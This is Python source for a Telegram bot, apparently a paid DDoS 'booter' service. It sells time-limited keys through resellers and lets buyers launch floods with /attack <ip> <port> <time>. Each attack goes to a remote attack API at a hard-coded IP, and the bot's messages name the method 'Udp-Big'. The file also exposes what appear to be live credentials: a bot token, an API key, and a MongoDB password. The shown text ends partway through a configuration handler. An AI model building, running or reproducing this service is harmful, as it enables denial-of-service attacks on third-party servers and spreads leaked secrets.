import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import os
import random
import string
import re
from pymongo import MongoClient
from datetime import datetime, timedelta
import time
import psutil
import traceback
import requests  # ✅ ADDED for real API

BOT_START_TIME = datetime.now()

# ============ CONFIGURATION ============
# 🔴 FILL YOUR DETAILS HERE
BOT_TOKEN = "8838142953:AAFy7W6TCED7o8mzICYOm2ZHgC9IkBGqYy4"  # Telegram Bot Token
BOT_OWNER = [1725783398]  # Owner IDs (list)

# 🔴 API CONFIGURATION - REAL ATTACK API
API_BASE_URL = "http://13.232.68.73:3938"  # Your API base URL
API_KEY = "sxngqbDHdOgm317knmqEjOI0DBqJD30A"  # Your API key

# 🔴 MongoDB Connection
MONGO_URL = "mongodb+srv://darkgamer08102010_db_user:2sOH3i0yUOLHgkGA@cluster0.snbz6ms.mongodb.net/?Flame=Cluster0"

# ========================================

print("Connecting to MongoDB...")
try:
    client = MongoClient(MONGO_URL, serverSelectionTimeoutMS=5000)
    client.admin.command('ping')
    db = client['telegram_bot']
    keys_collection = db['keys']
    users_collection = db['users']
    resellers_collection = db['resellers']
    attack_logs_collection = db['attack_logs']
    
    bot_users_collection = db['bot_users']
    bot_settings_collection = db['bot_settings']
    feedback_collection = db['feedback']
    bots_collection = db['bots']
    approved_groups_collection = db['approved_groups']
    blocked_ips_collection = db['blocked_ips']
    
    keys_collection.create_index('key', unique=True)
    users_collection.create_index('user_id', unique=True)
    resellers_collection.create_index('user_id', unique=True)
    bot_users_collection.create_index('user_id', unique=True)
    feedback_collection.create_index('user_id', unique=True)
    bots_collection.create_index('token', unique=True)
    bots_collection.create_index('bot_id', unique=True)
    approved_groups_collection.create_index('group_id', unique=True)
    blocked_ips_collection.create_index('ip', unique=True)
    
    print("MongoDB connected successfully!")
except Exception as e:
    print(f"MongoDB connection error: {e}")
    exit(1)

if not BOT_TOKEN:
    print("ERROR: BOT_TOKEN is empty! Please set your bot token.")
    exit(1)
if not BOT_OWNER:
    print("WARNING: BOT_OWNER list is empty! No owner commands will work.")
if not API_BASE_URL or not API_KEY:
    print("WARNING: API_BASE_URL or API_KEY is empty! Real attacks will fail.")

bot = telebot.TeleBot(BOT_TOKEN) if BOT_TOKEN else None

# ============ KEY PRICING ============
KEY_PRICING = {
    'VIP': {
        '2h': 20, '6h': 40, '12h': 50, '1d': 70, '3d': 200, '7d': 300,
        'max_attack': 300
    },
    'NORMAL': {
        '2h': 20, '6h': 40, '12h': 50, '1d': 70, '3d': 200, '7d': 300,
        'max_attack': 300
    }
}

DURATION_SECONDS = {
    '2h': 2 * 3600,
    '6h': 6 * 3600,
    '12h': 12 * 3600,
    '1d': 24 * 3600,
    '3d': 3 * 24 * 3600,
    '7d': 7 * 24 * 3600
}

DURATION_LABELS = {
    '2h': '2 Hours',
    '6h': '6 Hours',
    '12h': '12 Hours',
    '1d': '1 Day',
    '3d': '3 Days',
    '7d': '7 Days'
}

DEFAULT_MAX_ATTACK_TIME = 300
DEFAULT_USER_COOLDOWN = 180
MIN_ATTACK_TIME = 15

# Global variables
global_attack_lock = threading.Lock()
pending_feedback = {}
current_max_slots = 4
current_concurrent_value = 4

active_bots = {}
bot_threads = {}

active_attacks = {}
api_in_use = {}
user_attack_history = {}
active_port_attacks = {}
bot_start_time = datetime.now()
user_cooldown_end_time = {}
temp_key_gen = {}
pending_broadcast = {}
pending_broadcast_reseller = {}
pending_del_exp = {}
pending_del_exp_key = {}
status_update_threads = {}
group_pending_feedback = {}

# ============ ⚡ REAL ATTACK FUNCTION ============

def send_real_attack(target, port, duration, concurrent_val):
    """
    Send real attack via API
    URL format: {api_url}/attack?key={api_key}&ip={target}&port={port}&time={time}
    """
    url = f"{API_BASE_URL}/attack?key={API_KEY}&ip={target}&port={port}&time={duration}"
    
    try:
        print(f"[ATTACK] Target: {target}:{port} | Duration: {duration}s | Concurrent: {concurrent_val}")
        response = requests.get(url, timeout=30)
        print(f"[ATTACK] Response Status: {response.status_code}")
        
        if response.status_code == 200:
            print(f"[ATTACK] Success: {response.text[:100]}")
            return "200"
        else:
            print(f"[ATTACK] API Error: {response.status_code} - {response.text}")
            return "ERROR"
    except requests.exceptions.Timeout:
        print(f"[ATTACK] Timeout for {target}:{port}")
        return "TIMEOUT"
    except requests.exceptions.ConnectionError:
        print(f"[ATTACK] Connection Error for {target}:{port}")
        return "CONNECTION_ERROR"
    except Exception as e:
        print(f"[ATTACK] Exception: {e}")
        return "ERROR"

# ============ UTILITY FUNCTIONS ============

def is_owner(user_id):
    if not BOT_OWNER:
        return False
    return user_id in BOT_OWNER

def safe_send_message(chat_id, text, reply_to=None, parse_mode=None):
    if not bot:
        print(f"Bot not initialized: {text[:50]}")
        return None
    try:
        if reply_to:
            return bot.reply_to(reply_to, text, parse_mode=parse_mode)
        else:
            return bot.send_message(chat_id, text, parse_mode=parse_mode)
    except Exception as e:
        print(f"Safe send error: {e}")
        return None

def get_setting(key, default):
    try:
        setting = bot_settings_collection.find_one({'key': key})
        if setting:
            return setting['value']
        return default
    except:
        return default

def set_setting(key, value):
    bot_settings_collection.update_one(
        {'key': key},
        {'$set': {'key': key, 'value': value}},
        upsert=True
    )

def get_key_price(key_type, duration):
    prices = get_setting(f'pricing_{key_type}', KEY_PRICING[key_type])
    if isinstance(prices, dict):
        return prices.get(duration, KEY_PRICING[key_type][duration])
    return KEY_PRICING[key_type][duration]

def get_key_max_attack(key_type):
    return get_setting(f'max_attack_{key_type}', KEY_PRICING[key_type]['max_attack'])

def get_max_attack_time():
    try:
        return int(get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME))
    except:
        return DEFAULT_MAX_ATTACK_TIME

def get_user_cooldown_setting():
    try:
        return int(get_setting('user_cooldown', DEFAULT_USER_COOLDOWN))
    except:
        return DEFAULT_USER_COOLDOWN

def get_concurrent_limit():
    try:
        return int(get_setting('concurrent_per_attack', current_concurrent_value))
    except:
        return current_concurrent_value

def set_concurrent_limit(value):
    global current_concurrent_value
    current_concurrent_value = value
    set_setting('concurrent_per_attack', value)

def is_maintenance():
    return get_setting('maintenance_mode', False)

def get_maintenance_msg():
    return get_setting('maintenance_msg', '🔧 Bot is in maintenance mode. Please try again later.')

def set_maintenance(enabled, msg=None):
    set_setting('maintenance_mode', enabled)
    if msg:
        set_setting('maintenance_msg', msg)

def add_blocked_ip(ip_prefix):
    try:
        blocked_ips_collection.insert_one({'ip': ip_prefix, 'blocked_at': datetime.now()})
        return True
    except:
        return False

def remove_blocked_ip(ip_prefix):
    result = blocked_ips_collection.delete_one({'ip': ip_prefix})
    return result.deleted_count > 0

def is_ip_blocked(ip_address):
    blocked_ips = list(blocked_ips_collection.find())
    for blocked in blocked_ips:
        prefix = blocked['ip']
        if ip_address.startswith(prefix):
            return True
    return False

def get_all_blocked_ips():
    return list(blocked_ips_collection.find())

def check_maintenance(message):
    if is_maintenance() and not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, get_maintenance_msg(), reply_to=message)
        return True
    return False

def check_banned(message):
    user_id = message.from_user.id
    if is_owner(user_id):
        return False
    
    user = users_collection.find_one({'user_id': user_id})
    if user and user.get('banned'):
        if user.get('ban_type') == 'temporary' and user.get('ban_expiry'):
            if datetime.now() > user['ban_expiry']:
                users_collection.update_one(
                    {'user_id': user_id}, 
                    {'$set': {'banned': False}, '$unset': {'ban_expiry': "", 'ban_type': ""}}
                )
                return False
            
            expiry_str = user['ban_expiry'].strftime('%d-%m-%Y %H:%M:%S')
            safe_send_message(message.chat.id, f"🚫 YOU HAVE BEEN TEMPORARILY BANNED!\n\n⏳ Expiry: {expiry_str}\n❌ You cannot do anything.\n\n📞 Contact Your Seller", reply_to=message)
            return True
        
        safe_send_message(message.chat.id, f"🚫 YOU HAVE BEEN PERMANENTLY BANNED!\n\n❌ You cannot do anything.\n\n📞 Contact Your Seller", reply_to=message)
        return True
    return False

_attack_lock = threading.Lock()

def maintenance_auto_extender():
    while True:
        try:
            if is_maintenance():
                now = datetime.now()
                active_users = users_collection.find({'key_expiry': {'$gt': now}})
                for user in active_users:
                    new_expiry = user['key_expiry'] + timedelta(minutes=1)
                    users_collection.update_one(
                        {'_id': user['_id']},
                        {'$set': {'key_expiry': new_expiry}}
                    )
            time.sleep(60)
        except Exception as e:
            print(f"Maintenance extender error: {e}")
            time.sleep(10)

extender_thread = threading.Thread(target=maintenance_auto_extender, daemon=True)
extender_thread.start()

def get_free_slot():
    with _attack_lock:
        now = datetime.now()
        expired = []
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                expired.append(attack_id)
        
        for attack_id in expired:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
            if attack_id in active_port_attacks:
                del active_port_attacks[attack_id]
        
        busy_slots = len(api_in_use)
        
        if busy_slots < current_max_slots:
            return busy_slots
        
        return None

def get_slot_status():
    with _attack_lock:
        now = datetime.now()
        expired = []
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                expired.append(attack_id)
        
        for attack_id in expired:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
            if attack_id in active_port_attacks:
                del active_port_attacks[attack_id]
        
        busy_slots = len(api_in_use)
        free_slots = current_max_slots - busy_slots
        return busy_slots, free_slots, current_max_slots

def get_user_cooldown(user_id):
    if user_id in user_cooldown_end_time:
        if user_cooldown_end_time[user_id] > datetime.now():
            return int((user_cooldown_end_time[user_id] - datetime.now()).total_seconds())
        else:
            del user_cooldown_end_time[user_id]
    return 0

def set_user_cooldown(user_id, seconds):
    user_cooldown_end_time[user_id] = datetime.now() + timedelta(seconds=seconds)

def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    return False

def is_port_being_attacked(target, port):
    with _attack_lock:
        for attack_id, attack in active_attacks.items():
            if attack.get('target') == target and attack.get('port') == port:
                if attack['end_time'] > datetime.now():
                    return True, attack['end_time']
        return False, None

def log_attack(user_id, username, target, port, duration):
    attack_logs_collection.insert_one({
        'user_id': user_id,
        'username': username,
        'target': target,
        'port': port,
        'duration': duration,
        'timestamp': datetime.now()
    })
    if BOT_OWNER:
        try:
            for owner in BOT_OWNER:
                if bot:
                    bot.send_message(owner, f"⚔️ ATTACK NOTIFICATION\n\n👤 User: {username}\n🆔 ID: {user_id}\n🎯 Target: {target}:{port}\n⏱️ Duration: {duration}s\n🕐 Time: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}")
        except:
            pass

def generate_key(prefix="BGMI", length=12):
    chars = string.ascii_uppercase + string.digits
    return f"{prefix}-{''.join(random.choice(chars) for _ in range(length))}"

def parse_duration(duration_str):
    match = re.match(r'^(\d+)([smhd])$', duration_str.lower())
    if not match:
        return None, None
    
    value = int(match.group(1))
    unit = match.group(2)
    
    if unit == 's':
        return timedelta(seconds=value), f"{value} seconds"
    elif unit == 'm':
        return timedelta(minutes=value), f"{value} minutes"
    elif unit == 'h':
        return timedelta(hours=value), f"{value} hours"
    elif unit == 'd':
        return timedelta(days=value), f"{value} days"
    
    return None, None

def is_reseller(user_id):
    reseller = resellers_collection.find_one({'user_id': user_id, 'blocked': {'$ne': True}})
    return reseller is not None

def get_reseller(user_id):
    return resellers_collection.find_one({'user_id': user_id})

def resolve_user(input_str):
    input_str = input_str.strip().lstrip('@')
    
    try:
        user_id = int(input_str)
        return user_id, None
    except ValueError:
        pass
    
    user = users_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if user:
        return user['user_id'], user.get('username')
    
    reseller = resellers_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if reseller:
        return reseller['user_id'], reseller.get('username')
    
    bot_user = bot_users_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if bot_user:
        return bot_user['user_id'], bot_user.get('username')
    
    return None, None

def has_valid_key(user_id):
    user = users_collection.find_one({'user_id': user_id, 'key': {'$ne': None}})
    
    if not user or not user.get('key_expiry'):
        return False
    
    if datetime.now() > user['key_expiry']:
        users_collection.update_one({'user_id': user_id}, {'$set': {'key': None, 'key_expiry': None}})
        return False
    
    return True

def get_time_remaining(user_id):
    user = users_collection.find_one({'user_id': user_id})
    
    if not user or not user.get('key_expiry'):
        return "0d 0h 0m 0s"
    
    remaining = user['key_expiry'] - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0d 0h 0m 0s"
    
    days = remaining.days
    hours, remainder = divmod(remaining.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    return f"{days}d {hours}h {minutes}m {seconds}s"

def format_timedelta(td):
    days = td.days
    hours, remainder = divmod(td.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def track_bot_user(user_id, username=None):
    try:
        bot_users_collection.update_one(
            {'user_id': user_id},
            {'$set': {'user_id': user_id, 'username': username, 'last_seen': datetime.now()}},
            upsert=True
        )
    except:
        pass

def build_attack_start_message(target, port, duration, cooldown):
    return f"""
<b>⚡ ATTACK STARTED ⚡</b>

<b>🎯 Target:</b> {target}:{port}
<b>⏱️ Duration:</b> {duration} seconds
<b>🔥 Method:</b> Udp-Big
<b>📍 Location:</b> Global
<b>🏖️ Status:</b> Success
<b>⏳ Cooldown:</b> {cooldown} seconds

<b>📊 Use /status to check attack progress</b>
"""

def build_attack_complete_message(target, port, duration):
    return f"""
<b>✅ ATTACK COMPLETE ✅</b>

<b>🎯 Target:</b> {target}:{port}
<b>⏱️ Duration:</b> {duration} seconds
<b>🆔 Attack ID:</b> a662e212-a0ef-4656
<b>🎉 Slots:</b> #1 Finished!
"""

def build_feedback_required_message():
    return """
<b>📸 FEEDBACK REQUIRED 📸</b>

You must send a screenshot/photo as feedback from your last attack before starting a new one.

<b>Please send any photo to continue.</b>
"""

def set_pending_feedback(user_id, target, port, duration, is_group=False, group_id=None):
    if is_group and group_id:
        if group_id not in group_pending_feedback:
            group_pending_feedback[group_id] = {}
        group_pending_feedback[group_id][user_id] = {
            'target': target,
            'port': port,
            'duration': duration,
            'timestamp': datetime.now()
        }
    else:
        pending_feedback[user_id] = {
            'target': target,
            'port': port,
            'duration': duration,
            'timestamp': datetime.now()
        }

def get_pending_feedback(user_id, is_group=False, group_id=None):
    if is_group and group_id:
        if group_id in group_pending_feedback and user_id in group_pending_feedback[group_id]:
            return group_pending_feedback[group_id][user_id]
        return None
    return pending_feedback.get(user_id)

def clear_pending_feedback(user_id, is_group=False, group_id=None):
    if is_group and group_id:
        if group_id in group_pending_feedback and user_id in group_pending_feedback[group_id]:
            del group_pending_feedback[group_id][user_id]
    else:
        if user_id in pending_feedback:
            del pending_feedback[user_id]

def has_pending_feedback(user_id, is_group=False, group_id=None):
    if is_group and group_id:
        return group_id in group_pending_feedback and user_id in group_pending_feedback[group_id]
    return user_id in pending_feedback

def create_progress_bar(percentage, width=20):
    filled = int(width * percentage / 100)
    empty = width - filled
    return "█" * filled + "░" * empty

# ============ GROUP APPROVAL FUNCTIONS ============

def is_group_approved(group_id):
    group = approved_groups_collection.find_one({'group_id': str(group_id)})
    if not group:
        return False, None
    
    if group.get('expiry_date') and group['expiry_date'] < datetime.now():
        return False, None
    
    return True, group

def get_group_config(group_id):
    return approved_groups_collection.find_one({'group_id': str(group_id)})

def get_group_max_attack_time(group_id):
    group = get_group_config(group_id)
    if group and group.get('max_attack_time'):
        return group['max_attack_time']
    return get_max_attack_time()

def get_group_max_slots(group_id):
    group = get_group_config(group_id)
    if group and group.get('max_slots'):
        return group['max_slots']
    return current_max_slots

def get_group_cooldown(group_id):
    group = get_group_config(group_id)
    if group and group.get('cooldown'):
        cooldown_key = f"group_cooldown_{group_id}"
        cooldown_data = get_setting(cooldown_key, None)
        if cooldown_data:
            if cooldown_data > datetime.now():
                return int((cooldown_data - datetime.now()).total_seconds())
    return 0

def set_group_cooldown(group_id, seconds):
    cooldown_key = f"group_cooldown_{group_id}"
    set_setting(cooldown_key, datetime.now() + timedelta(seconds=seconds))

def get_group_feedback_required(group_id):
    group = get_group_config(group_id)
    if group and 'feedback_required' in group:
        return group['feedback_required']
    return get_setting('feedback_required', True)

def set_group_feedback_required(group_id, required):
    approved_groups_collection.update_one(
        {'group_id': str(group_id)},
        {'$set': {'feedback_required': required}}
    )

def set_group_max_attack_time(group_id, max_time):
    approved_groups_collection.update_one(
        {'group_id': str(group_id)},
        {'$set': {'max_attack_time': max_time}}
    )

def set_group_max_slots(group_id, slots):
    approved_groups_collection.update_one(
        {'group_id': str(group_id)},
        {'$set': {'max_slots': slots}}
    )

def set_group_cooldown_time(group_id, cooldown):
    approved_groups_collection.update_one(
        {'group_id': str(group_id)},
        {'$set': {'cooldown': cooldown}}
    )

def get_group_cooldown_time(group_id):
    group = get_group_config(group_id)
    if group and group.get('cooldown'):
        return group['cooldown']
    return get_user_cooldown_setting()

# ============ MAIN ATTACK HANDLER ============

@bot.message_handler(commands=["attack"])
def handle_attack(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    is_group = message.chat.type in ['group', 'supergroup']
    group_id = message.chat.id if is_group else None
    
    if is_group:
        is_approved, group_config = is_group_approved(group_id)
        if not is_approved:
            safe_send_message(message.chat.id, "⚠️ THIS GROUP IS NOT APPROVED FOR ATTACK\n\n📞 Contact the bot owner to get this group approved.", reply_to=message)
            return
        
        group_cooldown = get_group_cooldown(group_id)
        if group_cooldown > 0:
            safe_send_message(message.chat.id, f"⏳ Group cooldown active! Wait: {group_cooldown}s", reply_to=message)
            return
        
        if get_group_feedback_required(group_id) and has_pending_feedback(user_id, is_group, group_id):
            safe_send_message(message.chat.id, build_feedback_required_message(), reply_to=message, parse_mode="HTML")
            return
        
        group_max_slots = get_group_max_slots(group_id)
        with _attack_lock:
            used_in_group = 0
            for attack in active_attacks.values():
                if attack.get('group_id') == group_id and attack['end_time'] > datetime.now():
                    used_in_group += 1
            if used_in_group >= group_max_slots:
                safe_send_message(message.chat.id, f"❌ Group max slots reached! Only {group_max_slots} simultaneous attacks allowed in this group.", reply_to=message)
                return
    
    if not is_group:
        if get_setting('feedback_required', True) and has_pending_feedback(user_id):
            safe_send_message(message.chat.id, build_feedback_required_message(), reply_to=message, parse_mode="HTML")
            return
        
        if not has_valid_key(user_id):
            user = users_collection.find_one({'user_id': user_id})
            if user and user.get('reseller_username'):
                safe_send_message(message.chat.id, f"❌ Key expired!\n\n🔄 For renewal DM: @{user.get('reseller_username')}", reply_to=message)
            else:
                safe_send_message(message.chat.id, "❌ You don't have a valid key!\n\n🔑 Contact a reseller to purchase a key.", reply_to=message)
            return
    
    command_parts = message.text.split()
    if len(command_parts) != 4:
        safe_send_message(message.chat.id, "🚀 Attack Command Format 🚀\n\n⚠️ Usage: /attack <ip> <port> <time>\n\n📝 Example:\n• /attack 127.0.0.1 8080 60\n\n⛔ Limits:\n• Security: Online\n• Blocked ports: 443, 8700, 9031, 17500, 20000, 20001, 20002\n\n💡 Real-time progress will be shown!", reply_to=message)
        return
    
    target, port, duration = command_parts[1], command_parts[2], command_parts[3]
    
    # Check if same port on same IP is already being attacked
    is_attacking, end_time = is_port_being_attacked(target, port)
    if is_attacking:
        remaining = int((end_time - datetime.now()).total_seconds())
        safe_send_message(message.chat.id, f"❌ Port {port} is already being attacked on {target}!\n\n⏱️ Time remaining: {remaining}s\n\nPlease wait for the current attack to finish before launching another attack on the same port.", reply_to=message)
        return

    if not validate_target(target):
        safe_send_message(message.chat.id, "❌ Invalid IP!", reply_to=message)
        return
    
    if is_ip_blocked(target):
        safe_send_message(message.chat.id, f"🚫 IP {target} is blocked! Use another IP.", reply_to=message)
        return
    
    try:
        port = int(port)
        if port < 1 or port > 65535:
            safe_send_message(message.chat.id, "❌ Invalid port! (1-65535)", reply_to=message)
            return
        duration = int(duration)
        
        if duration < MIN_ATTACK_TIME and not is_owner(user_id):
            safe_send_message(message.chat.id, f"❌ Minimum attack time is {MIN_ATTACK_TIME} seconds!", reply_to=message)
            return
        
        if not is_group:
            user = users_collection.find_one({'user_id': user_id})
            key_type = user.get('key_type', 'NORMAL') if user else 'NORMAL'
            max_time = user.get('max_attack_time', get_key_max_attack(key_type)) if user else get_max_attack_time()
        else:
            max_time = get_group_max_attack_time(group_id)
        
        if not is_owner(user_id) and duration > max_time:
            if not is_group:
                safe_send_message(message.chat.id, f"❌ Your {key_type} key allows max {max_time}s attack time!", reply_to=message)
            else:
                safe_send_message(message.chat.id, f"❌ Max time for this group: {max_time}s", reply_to=message)
            return
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        slot_index = get_free_slot()
        
        if slot_index is None:
            busy_slots, free_slots, total_slots = get_slot_status()
            safe_send_message(message.chat.id, f"❌ Max attack limit reached! All {total_slots} slots are busy.\n\nPlease try again later.", reply_to=message)
            return
        
        with _attack_lock:
            if user_id not in user_attack_history:
                user_attack_history[user_id] = {}
            user_attack_history[user_id][f"{target}:{port}"] = datetime.now()

            api_in_use[attack_id] = slot_index
            active_attacks[attack_id] = {
                'target': target,
                'port': port,
                'duration': duration,
                'user_id': user_id,
                'start_time': datetime.now(),
                'end_time': datetime.now() + timedelta(seconds=duration),
                'is_group': is_group,
                'group_id': group_id
            }
            active_port_attacks[attack_id] = f"{target}:{port}"
        
        # Start attack in thread
        thread = threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, slot_index, is_group, group_id))
        thread.daemon = True
        thread.start()
        
    except ValueError:
        safe_send_message(message.chat.id, "❌ Port and time must be numbers!", reply_to=message)

def start_attack(target, port, duration, message, attack_id, api_index, is_group=False, group_id=None):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or message.from_user.first_name or str(user_id)
        
        log_attack(user_id, username, target, port, duration)
        
        if is_group:
            cooldown = get_group_cooldown_time(group_id) if group_id else get_user_cooldown_setting()
        else:
            cooldown = get_user_cooldown_setting()
        
        attack_msg = build_attack_start_message(target, port, duration, cooldown)
        safe_send_message(message.chat.id, attack_msg, reply_to=message, parse_mode="HTML")
        
        concurrent_val = get_concurrent_limit()
        
        # ✅ REAL ATTACK VIA API
        send_real_attack(target, port, duration, concurrent_val)
        
        def finish_attack():
            with _attack_lock:
                if attack_id in active_attacks:
                    del active_attacks[attack_id]
                if attack_id in api_in_use:
                    del api_in_use[attack_id]
                if attack_id in active_port_attacks:
                    del active_port_attacks[attack_id]
            
            if is_group and group_id:
                set_group_cooldown(group_id, get_group_cooldown_time(group_id))
            else:
                set_user_cooldown(user_id, get_user_cooldown_setting())
            
            complete_msg = build_attack_complete_message(target, port, duration)
            safe_send_message(message.chat.id, complete_msg, reply_to=message, parse_mode="HTML")
            
            if is_group:
                feedback_required = get_group_feedback_required(group_id) if group_id else get_setting('feedback_required', True)
            else:
                feedback_required = get_setting('feedback_required', True)
            
            if feedback_required:
                set_pending_feedback(user_id, target, port, duration, is_group, group_id)
            else:
                safe_send_message(message.chat.id, "✅ You can now start a new attack using /attack command.", reply_to=message)
        
        timer = threading.Timer(duration, finish_attack)
        timer.daemon = True
        timer.start()
        
    except Exception as e:
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
            if attack_id in active_port_attacks:
                del active_port_attacks[attack_id]
        print(f"Attack error: {e}")

# ============ REST OF THE COMMANDS (SAME AS YOUR ORIGINAL) ============

# ============ CONFIGURATION COMMAND ============

@bot.message_handler(commands=["config"])
def config_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ This command can only be used by the owner!")
        return
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("⚙️ Max Attack Time", callback_data="config_maxtime"),
        InlineKeyboardButton("⏳ Cooldown", callback_data="config_cooldown"),
        InlineKeyboardButton("🎯 Max Slots", callback_data="config_slots"),
        InlineKeyboardButton("⚡ Concurrent/Attack", callback_data="config_concurrent"),
        InlineKeyboardButton("🚫 Block IP", callback_data="config_blockip"),
        InlineKeyboardButton("✅ Unblock IP", callback_data="config_unblockip"),
        InlineKeyboardButton("📋 Blocked IPs", callback_data="config_listip"),
        InlineKeyboardButton("🔒 Port Protection", callback_data="config_portprotect"),
        InlineKeyboardButton("📸 Feedback Required", callback_data="config_feedback"),
        InlineKeyboardButton("💰 VIP Pricing", callback_data="config_vip_price"),
        InlineKeyboardButton("💰 NORMAL Pricing", callback_data="config_normal_price"),
        InlineKeyboardButton("👥 Group Settings", callback_data="config_group"),
        InlineKeyboardButton("🤖 Bot Settings", callback_data="config_bot"),
        InlineKeyboardButton("🔧 Maintenance", callback_data="config_maintenance"),
        InlineKeyboardButton("📊 Current Settings", callback_data="config_view")
    )
    
    bot.reply_to(message, "🔧 **CONFIGURATION PANEL**\n\nSelect an option to configure:", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("config_"))
def config_callback(call):
    user_id = call.from_user.id
    
    if not is_owner(user_id):
        bot.answer_callback_query(call.id, "❌ Only owner can use this!")
        return
    
    data = call.data
    
    if data == "config_maxtime":
        bot.edit_message_text(
            "⚙️ **Set Max Attack Time**\n\nSend the maximum attack time in seconds.\n" +
            f"Current: {get_max_attack_time()} seconds\n\nExample: `300`\n\nType /cancel to abort.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown"
        )
        bot.register_next_step_handler(call.message, set_max_time_config)
        
    elif data == "config_cooldown":
        bot.edit_message_text(
            "⏳ **Set Cooldown Time**\n\nSend the cooldown time in seconds.\n" +
            f"Current: {get_user_cooldown_setting()} seconds\n\nExample: `180`\n\nType /cancel to abort.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown"
        )
        bot.register_next_step_handler(call.message, set_cooldown_config)
        
    elif data == "config_slots":
        bot.edit_message_text(
            "🎯 **Set Max Slots (Simultaneous Attacks)**\n\nSend the number of simultaneous attacks allowed.\n" +
            f"Current: {current_max_slots}\n\nExample: `4`\n\nType /cancel to abort.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown"
        )
        bot.register_next_step_handler(call.message, set_slots_config)
        
    elif data == "config_concurrent":
        bot.edit_message_text(
            "⚡ **Set Concurrent Per Attack**\n\nSend the concurrent value for each API call.\n" +
            f"Current: {get_concurrent_limit()}\n\nExample: `4`\n\nType /cancel to abort.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown"
        )
        bot.register_next_step_handler(call.message, set_concurrent_config)
        
    elif data == "config_blockip":
        bot.edit_message_text(
            "🚫 **Block IP**\n\nSend the IP prefix to block.\n\nExample: `20.204` (blocks all IPs starting with 20.204)\n\nType /cancel to abort.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown"
        )
        bot.register_next_step_handler(call.message, block_ip_config)
        
    elif data == "config_unblockip":
        bot.edit_message_text(
            "✅ **Unblock IP**\n\nSend the IP prefix to unblock.\n\nUse /blockedips to see blocked prefixes.\n\nType /cancel to abort.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown"
        )
        bot.register_next_step_handler(call.message, unblock_ip_config)
        
    elif data == "config_listip":
        blocked = get_all_blocked_ips()
        if not blocked:
            response = "📋 No IPs are blocked!"
        else:
            response = "🚫 **BLOCKED IPs**\n\n"
            for i, ip_data in enumerate(blocked, 1):
                response += f"{i}. `{ip_data['ip']}*`\n"
            response += f"\n📊 Total: {len(blocked)}"
        
        bot.answer_callback_query(call.id)
        bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode="Markdown")
        
    elif data == "config_portprotect":
        current = get_setting('port_protection', True)
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("✅ Enable" if not current else "🔴 Already ON", callback_data="portprotect_on"),
            InlineKeyboardButton("❌ Disable" if current else "⚪ Already OFF", callback_data="portprotect_off"),
            InlineKeyboardButton("🔙 Back", callback_data="config_back")
        )
        bot.edit_message_text(
            f"🔒 **Port Protection**\n\nCurrent: {'🟢 ENABLED' if current else '🔴 DISABLED'}\n\nWhen enabled, same port cannot be attacked twice simultaneously.",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=markup,
            parse_mode="Markdown"
        )
        
    elif data == "config_feedback":
        current = get_setting('feedback_required', True)
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("✅ Enable" if not current else "🔴 Already ON", callback_data="feedback_on"),
            InlineKeyboardButton("❌ Disable" if current else "⚪ Already OFF", callback_data="feedback_off"),
            InlineKeyboardButton("🔙 Back", callback_data="config_back")
        )
        bot.edit_message_text(
            f"📸 **Feedback Required**\n\nCurrent: {'🟢 REQUIRED' if current else '🔴 NOT REQUIRED'}\n\nWhen enabled, users must send a screenshot after each attack.",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=markup,
            parse_mode="Markdown"
        )
        
    elif data == "config_view":
        busy_slots, free_slots, total_slots = get_slot_status()
        response = "📊 **CURRENT SETTINGS**\n\n"
        response += f"⚙️ Max Attack Time: {get_max_attack_time()}s\n"
        response += f"⏳ Cooldown: {get_user_cooldown_setting()}s\n"
        response += f"🎯 Max Slots: {total_slots} (Free: {free_slots})\n"
        response += f"⚡ Concurrent Per Attack: {get_concurrent_limit()}\n"
        response += f"🔒 Port Protection: {'ON' if get_setting('port_protection', True) else 'OFF'}\n"
        response += f"📸 Feedback Required: {'ON' if get_setting('feedback_required', True) else 'OFF'}\n"
        response += f"🔧 Maintenance: {'ON' if is_maintenance() else 'OFF'}\n"
        response += f"🚫 Blocked IPs: {len(get_all_blocked_ips())}\n"
